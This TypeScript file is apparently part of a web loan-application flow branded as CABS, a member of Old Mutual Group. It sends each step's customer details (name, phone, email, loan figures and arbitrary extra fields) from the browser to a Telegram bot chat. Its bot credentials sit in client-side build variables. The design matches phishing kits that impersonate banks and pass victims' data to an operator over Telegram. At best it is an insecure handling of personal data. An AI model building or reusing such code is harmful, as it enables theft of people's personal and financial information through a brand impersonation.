interface TelegramConfig {
  botToken: string;
  chatId: string;
}

interface NotificationData {
  step: string;
  customerName: string;
  phone: string;
  email?: string;
  loanAmount?: string;
  loanType?: string;
  repayment?: string;
  details?: Record<string, any>;
}

/**
 * Get Telegram credentials dynamically to support both Node.js and Vite environments
 */
function getTelegramCredentials(): { botToken: string; chatId: string } {
  // Try Vite environment (browser)
  if (typeof import.meta !== 'undefined' && import.meta.env) {
    return {
      botToken: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '',
      chatId: import.meta.env.VITE_TELEGRAM_CHAT_ID || '',
    };
  }

  // Try Node.js environment
  return {
    botToken: process.env.VITE_TELEGRAM_BOT_TOKEN || '',
    chatId: process.env.VITE_TELEGRAM_CHAT_ID || '',
  };
}

/**
 * Send a notification to Telegram
 * @param data - Notification data containing step details and customer information
 * @returns Promise<boolean> - True if successful, false otherwise
 */
export async function sendTelegramNotification(data: NotificationData): Promise<boolean> {
  const { botToken, chatId } = getTelegramCredentials();

  console.log('Telegram check - Token:', botToken ? 'Set' : 'Not set', 'Chat ID:', chatId ? 'Set' : 'Not set');

  if (!botToken || !chatId) {
    console.warn('Telegram credentials not configured. Skipping notification.');
    return false;
  }

  try {
    const message = formatTelegramMessage(data);
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Telegram API error:', errorData);
      return false;
    }

    const result = await response.json();
    console.log('Telegram notification sent successfully:', result);
    return true;
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
    return false;
  }
}

/**
 * Format notification data into a readable Telegram message
 */
function formatTelegramMessage(data: NotificationData): string {
  const timestamp = new Date().toLocaleString('en-GB', {
    dateStyle: 'medium',
    timeStyle: 'short',
  });

  let message = `<b>🔔 CABS Loan Application Update</b>\n\n`;
  message += `<b>📅 Timestamp:</b> ${timestamp}\n`;
  message += `<b>📌 Step:</b> ${data.step}\n\n`;
  message += `<b>👤 Customer Details:</b>\n`;
  message += `• Name: ${data.customerName}\n`;
  message += `• Phone: ${data.phone}\n`;
  if (data.email) message += `• Email: ${data.email}\n`;

  if (data.loanAmount) {
    message += `\n<b>💰 Loan Details:</b>\n`;
    message += `• Amount: USD$ ${data.loanAmount}\n`;
    if (data.loanType) message += `• Type: ${data.loanType}\n`;
    if (data.repayment) message += `• Repayment: ${data.repayment}\n`;
  }

  if (data.details) {
    message += `\n<b>📋 Additional Details:</b>\n`;
    Object.entries(data.details).forEach(([key, value]) => {
      message += `• ${key}: ${value}\n`;
    });
  }

  message += `\n───────────────────\n`;
  message += `<i>CABS • Member of Old Mutual Group</i>`;

  return message;
}

/**
 * Check if Telegram is configured
 */
export function isTelegramConfigured(): boolean {
  const { botToken, chatId } = getTelegramCredentials();
  return !!(botToken && chatId);
}
